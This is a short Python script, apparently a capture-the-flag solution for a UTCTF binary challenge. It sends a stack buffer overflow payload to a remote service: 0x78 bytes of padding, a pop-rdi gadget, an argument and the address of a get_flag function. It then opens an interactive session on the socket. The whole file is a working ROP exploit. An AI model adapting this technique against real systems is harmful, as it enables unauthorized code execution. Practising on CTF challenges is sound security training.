import struct
import socket
import telnetlib

SERVER = ('binary.utctf.live', 9002)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)

pop_rdi = 0x400693
get_flag = 0x4005ea

buf = b''
buf += b'a' * 0x78
buf += struct.pack('<Q', pop_rdi)
buf += struct.pack('<Q', 0xdeadbeef)
buf += struct.pack('<Q', get_flag)
buf += b'\n'

s.send(buf)

t = telnetlib.Telnet()
t.sock = s
t.interact()
